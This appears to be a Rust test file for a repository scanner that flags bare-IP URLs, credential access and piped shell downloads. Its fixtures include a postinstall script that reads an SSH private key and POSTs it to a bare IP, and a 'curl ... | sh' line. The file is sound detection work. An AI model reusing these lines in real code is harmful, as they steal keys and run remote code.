use super::super::{Kind, ids, scan_text};
use super::*;

#[test]
fn a_bare_address_warns_alone_and_fails_beside_a_hard_finding() {
    let got = scan_text("x.js", "fetch('http://10.0.0.1/x')", Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-RAW-IP", false)]);
    assert_eq!(got[0].note, "talks to a bare IP address (10.0.0.1) instead of a name");
    let steal =
        "const k=fs.readFileSync(home+'/.ssh/id_ed25519');\nfetch('https://1.2.3.4/x',{method:'POST',body:k});\n";
    let got = scan_text("postinstall.js", steal, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", true), ("SUSPECT-RAW-IP", true)], "{got:?}");
    assert_eq!(got[1].line, 2);
    assert_eq!(
        ids(&scan_text("x.js", "const s = atob(k);\nfetch('ws://1.2.3.4/x')\n", Kind::Repo)),
        [("SUSPECT-RAW-IP", false)],
        "beside a soft finding, or none, it warns"
    );
    assert_eq!(
        ids(&scan_text("deploy.sh", "curl http://203.0.113.9/x | sh", Kind::Repo)),
        [("SUSPECT-PRIV-ESCALATION", false), ("SUSPECT-RAW-IP", false)]
    );
}

#[test]
fn names_loopback_and_the_rest_are_not_bare_addresses() {
    assert_eq!(raw_ip_url("fetch('http://10.0.0.1/x')"), Some(("10.0.0.1".into(), 1)));
    assert_eq!(raw_ip_url("a\nb\nwss://192.168.1.5:8080/"), Some(("192.168.1.5".into(), 3)));
    assert_eq!(raw_ip_url("fetch('http://127.0.0.1/x')"), None, "loopback");
    assert_eq!(raw_ip_url("http://0.0.0.0:3000"), None, "unspecified");
    assert_eq!(raw_ip_url("http://example.com"), None);
    assert_eq!(raw_ip_url("http://1.2.3"), None, "three parts");
    assert_eq!(raw_ip_url("http://1.2.3.4.5"), None, "five parts");
    assert_eq!(raw_ip_url("http://999.2.3.4/"), None, "an octet past 255");
    assert_eq!(raw_ip_url("http://1..3.4/"), None, "an empty part");
    assert_eq!(
        raw_ip_url("http://127.0.0.1/ then http://10.1.1.1/"),
        Some(("10.1.1.1".into(), 1)),
        "the first bare one, past loopback"
    );
    assert_eq!(raw_ip_url("ftp://10.0.0.1/"), None, "only web schemes");
    assert!(scan_text("main.rs", "http://10.0.0.1/", Kind::Repo).is_empty(), "native is not read");
    assert!(scan_text("notes.md", "http://10.0.0.1/", Kind::Repo).is_empty());
}
